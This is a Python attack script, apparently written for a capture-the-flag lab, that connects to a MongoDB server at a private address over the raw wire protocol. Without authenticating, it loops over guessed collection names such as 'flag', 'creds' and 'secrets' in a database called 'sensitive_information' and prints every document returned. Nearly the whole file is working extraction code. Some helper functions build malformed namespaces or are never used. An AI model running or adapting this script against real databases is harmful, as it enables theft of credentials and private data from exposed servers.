#!/usr/bin/env python3
import socket
import struct
import bson

# Target configuration
ip = "10.129.228.30"
port = 27017
target_db = "sensitive_information"
collections_to_try = [
    "flag", "flags", "data", "secrets", "creds",
    "dump", "info", "leaks"
]

# BSON helpers
def build_bson(doc):
    return bson.BSON.encode(doc)

def parse_bson(data):
    try:
        return bson.BSON(data).decode()
    except:
        return None

# Mongo wire protocol helpers
def create_message(request_id, opcode, message):
    header = struct.pack("<iiii", 16 + len(message), request_id, 0, opcode)
    return header + message

def build_query(collection, query=None):
    if query is None:
        query = {}
    flags = 0
    full_collection = f"{target_db}.{collection}"
    header = struct.pack("<i", flags)
    header += full_collection.encode() + b"\x00"
    header += struct.pack("<ii", 0, 1)
    header += build_bson(query)
    return header

def build_isMaster():
    return build_query("$cmd", {"isMaster": 1})

def build_list_databases():
    return build_query("admin.$cmd", {"listDatabases": 1})

def build_list_collections(database):
    return build_query(f"{database}.$cmd", {"listCollections": 1})

def build_find_query(database, collection):
    return build_query(collection, {})

def send_and_receive(sock, message, request_id, opcode=2004):
    full_message = create_message(request_id, opcode, message)
    sock.sendall(full_message)
    response = sock.recv(4096)
    return response[16:] if len(response) > 16 else b''

# Extraction routine
def extract_cursor_document(response):
    try:
        doc = parse_bson(response)
        if not doc:
            return None
        if "cursor" in doc and "firstBatch" in doc["cursor"]:
            return doc["cursor"]["firstBatch"]
        return doc
    except:
        return None

def main():
    sock = socket.socket()
    sock.connect((ip, port))
    request_id = 1

    print(f"[+] Connected to MongoDB @ {ip}, targeting DB: {target_db}\n")

    for collection in collections_to_try:
        print(f"[>] Trying collection: {collection}")
        message = build_find_query(target_db, collection)
        response = send_and_receive(sock, message, request_id)
        result = extract_cursor_document(response)

        if isinstance(result, list) and result:
            for doc in result:
                print(f"    [*] Document: {doc}")
        elif isinstance(result, list) and not result:
            print("    [!] Empty cursor returned.")
        elif isinstance(result, dict):
            print(f"    [*] Document: {result}")
        else:
            print("    [!] No valid response.")

        request_id += 1

    sock.close()

if __name__ == "__main__":
    main()
